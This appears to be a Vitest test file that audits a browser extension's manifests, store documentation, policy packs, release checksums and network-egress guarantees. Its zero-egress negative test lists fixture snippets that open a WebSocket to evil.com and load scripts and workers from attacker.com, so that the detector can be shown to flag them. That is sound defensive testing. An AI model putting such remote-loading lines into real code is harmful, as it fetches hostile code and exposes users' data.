import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync } from 'fs';
import { resolve } from 'path';
import { createHash } from 'crypto';
import { ALL_POLICY_PACKS } from '../src/core/policy-packs';
import {
  auditZeroEgress,
  auditStoreMetadataParity,
  auditVocabulary,
  auditPolicyPacks,
  auditArchitectureDiagrams,
  auditPortfolioMasterBrief,
  scanDocumentationForVocabulary,
// @ts-expect-error - ESM audit script import without bundled d.ts
} from '../scripts/audit-claims.mjs';

describe('Store Metadata & Documentation Claims Linter (claims-linter.test.ts)', () => {
  const root = resolve(__dirname, '..');
  const pkg = JSON.parse(readFileSync(resolve(root, 'package.json'), 'utf-8'));
  const manifest = JSON.parse(readFileSync(resolve(root, 'manifest.json'), 'utf-8'));
  const publicManifest = JSON.parse(readFileSync(resolve(root, 'public/manifest.json'), 'utf-8'));
  const storeDoc = readFileSync(resolve(root, 'docs/CHROMEWEBSTORE.md'), 'utf-8');
  const roadmapDoc = readFileSync(resolve(root, 'ROADMAP.md'), 'utf-8');

  it('enforces version and manifest parity across package.json, manifest.json, public/manifest.json, and store documentation', () => {
    expect(manifest.version).toBe(pkg.version);
    expect(publicManifest).toEqual(manifest);
    expect(storeDoc).toContain(`knowthankyew-extension-v${pkg.version}.zip`);
    expect(roadmapDoc).toContain(`v${pkg.version}`);

    const parityErrors: string[] = [];
    auditStoreMetadataParity(parityErrors);
    expect(parityErrors).toEqual([]);
  });

  it('enforces live store baseline version alignment across CHROMEWEBSTORE.md, ROADMAP.md, and README.md', () => {
    const liveVersion = '1.6.0';
    expect(storeDoc).toContain(`\`${liveVersion}\` (Live & Approved in Chrome Web Store & Firefox AMO)`);
    expect(roadmapDoc).toContain(`v${liveVersion} Live on Chrome Web Store & Firefox AMO`);

    const readmeDoc = readFileSync(resolve(root, 'README.md'), 'utf-8');
    expect(readmeDoc).toContain(`knowthankyew-extension-v${liveVersion}.zip`);
  });

  const escapeRegex = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

  it('guarantees 100% of declared manifest permissions have reviewer justifications in CHROMEWEBSTORE.md', () => {
    const permissions: string[] = manifest.permissions || [];
    const secMatch = storeDoc.match(/##\s*2\.\s*Permissions Justification[\s\S]*?(?=##\s*3|$)/i);
    const sec = secMatch ? secMatch[0] : '';
    for (const perm of permissions) {
      const rowPattern = new RegExp(`^\\|\\s*\`?${escapeRegex(perm)}\`?\\s*\\|.*\\|.*\\|$`, 'm');
      expect(
        rowPattern.test(sec),
        `Manifest permission '${perm}' lacks a matching plain-English justification row in docs/CHROMEWEBSTORE.md`
      ).toBe(true);
    }
  });

  it('asserts Content Security Policy quoted in privacy documentation matches manifest.json', () => {
    const manifestCsp = manifest.content_security_policy?.extension_pages || '';
    expect(manifestCsp).toContain("connect-src 'none'");
    expect(storeDoc).toContain("connect-src 'none'");
  });

  it('verifies policy pack count, safe-regex safety, and @knowthankyew/policy-packs parity', () => {
    expect(ALL_POLICY_PACKS.length).toBe(4); // us-federal, state-arl, uk-dmcc, eu-crd
    const totalRules = ALL_POLICY_PACKS.reduce((sum, p) => sum + p.rules.length, 0);
    const totalPatterns = ALL_POLICY_PACKS.reduce(
      (sum, p) => sum + p.rules.reduce((pSum, r) => pSum + r.patterns.length, 0),
      0
    );

    expect(totalRules).toBeGreaterThanOrEqual(19);
    expect(totalPatterns).toBeGreaterThanOrEqual(66);

    const packErrors: string[] = [];
    auditPolicyPacks(packErrors, { runTimingChecks: false });
    expect(packErrors).toEqual([]);
  });

  it('verifies release zip packages and SHA256SUMS alignment when packaging artifacts exist', () => {
    const shaFile = resolve(root, 'SHA256SUMS');

    if (existsSync(shaFile)) {
      const shaContent = readFileSync(shaFile, 'utf-8');
      const lines = shaContent.split('\n').map((l) => l.trim()).filter(Boolean);
      const versionedZipRegex = new RegExp(`knowthankyew-extension-v${escapeRegex(pkg.version)}.*\\.zip$`);

      const zipLines = lines.filter((line) => {
        const parts = line.split(/\s+/);
        return parts.length >= 2 && versionedZipRegex.test(parts[1]);
      });

      expect(zipLines.length).toBeGreaterThan(0);
      const requireArtifacts = process.env.KTY_REQUIRE_ARTIFACTS === 'true';
      for (const line of zipLines) {
        const [expectedSha, zipFilename] = line.split(/\s+/);
        const zipPath = resolve(root, zipFilename);
        if (requireArtifacts) {
          expect(existsSync(zipPath), `Referenced artifact '${zipFilename}' in SHA256SUMS is missing on disk`).toBe(true);
        }
        if (existsSync(zipPath)) {
          const actualSha = createHash('sha256').update(readFileSync(zipPath)).digest('hex');
          expect(actualSha).toBe(expectedSha);
        }
      }
      const artifactParityErrors: string[] = [];
      auditStoreMetadataParity(artifactParityErrors, { requireArtifacts });
      expect(artifactParityErrors).toEqual([]);
    } else {
      // In clean CI environments before packaging, verify package script targets current versioning convention
      expect(pkg.scripts?.package).toContain('knowthankyew-extension-v${VERSION}.zip');
    }
  });

  it('prohibits unprovable marketing adjectives across documentation and UI via vocabulary guardrails', () => {
    const errors: string[] = [];
    auditVocabulary(errors);
    expect(errors).toEqual([]);

    // Allows "inconclusive" while still catching banned adjectives on the same line
    expect(scanDocumentationForVocabulary('Sparse scan is inconclusive.', 'docs/test.md')).toEqual([]);
    const mixedErrors = scanDocumentationForVocabulary('Sparse scan is inconclusive but bulletproof.', 'docs/test.md');
    expect(mixedErrors.length).toBe(1);
    expect(mixedErrors[0]).toContain("Prohibited marketing term 'bulletproof'");
  });

  it('validates architecture diagrams, diagram-meta frontmatter, referenced file paths, and dependency count in docs/ARCHITECTURE.md', () => {
    const errors: string[] = [];
    auditArchitectureDiagrams(errors);
    expect(errors).toEqual([]);

    // Negative test: missing diagram-meta, air-gap violation (Scanner -> MLWorker), non-existent file, and wrong dependency count
    const invalidErrors: string[] = [];
    auditArchitectureDiagrams(invalidErrors, {
      overrideArchitectureContent: `
# Broken Architecture
\`\`\`mermaid
flowchart TD
  Scanner["src/content/non-existent.ts"] -.->|"POST /classify-links"| MLWorker
\`\`\`
| 10 | **Minimal Production Dependencies** | Exactly 99 production dependencies |
## 4. Directory Structure
\`\`\`
knowthankyew-extension/
└── src/
    └── missing-folder/
\`\`\`
`,
    });
    expect(invalidErrors.some((e) => e.includes('missing required <!-- diagram-meta'))).toBe(true);
    expect(invalidErrors.some((e) => e.includes('Content Scanner (src/content/scanner.ts) is air-gapped'))).toBe(true);
    expect(invalidErrors.some((e) => e.includes("non-existent file 'src/content/non-existent.ts'"))).toBe(true);
    expect(invalidErrors.some((e) => e.includes("non-existent path 'src/missing-folder'"))).toBe(true);
    expect(invalidErrors.some((e) => e.includes('Invariant #10 drift'))).toBe(true);
  });

  it('scans source runtime to verify zero remote network egress outside local loopback ML client', () => {
    const errors: string[] = [];
    auditZeroEgress(errors);
    expect(errors).toEqual([]);

    // Fixture-based negative test asserting unauthorized egress primitives are reported
    const primitiveErrors: string[] = [];
    auditZeroEgress(primitiveErrors, {
      overrideCodeSnippets: [
        'const f = fetch;',
        'navigator?.sendBeacon("/api/telemetry");',
        'const ws = new WebSocket("wss://evil.com");',
        "import('https://attacker.com/evil.js')",
        "import(`https://attacker.com/evil.js`)",
        "import('http://attacker.com/evil.js')",
        "new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('https://attacker.com/worker.js'))",
        "document.createElement('script')",
        "new Image()",
      ],
    });
    expect(primitiveErrors.length).toBe(10);

    // Negative test asserting comments and local workers are NOT flagged
    const benignErrors: string[] = [];
    auditZeroEgress(benignErrors, {
      overrideCodeSnippets: [
        "// import('https://attacker.com/evil.js')",
        "const a = 1; // new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('./edge-worker.ts', import.meta.url))",
      ],
    });
    expect(benignErrors).toEqual([]);
  });

  it('verifies Portfolio Master Brief parity (test count and test file inventory) if brief is present', () => {
    const errors: string[] = [];
    const checked = auditPortfolioMasterBrief(errors);
    if (checked) {
      expect(errors).toEqual([]);
    }

    // Negative test: brief required but missing
    const missingErrors: string[] = [];
    auditPortfolioMasterBrief(missingErrors, {
      requireBrief: true,
      overrideBriefPath: '/non-existent/path/BRIEF.md',
    });
    expect(missingErrors.length).toBeGreaterThan(0);
    expect(missingErrors[0]).toContain('not found but required via --require-brief');
  });
});
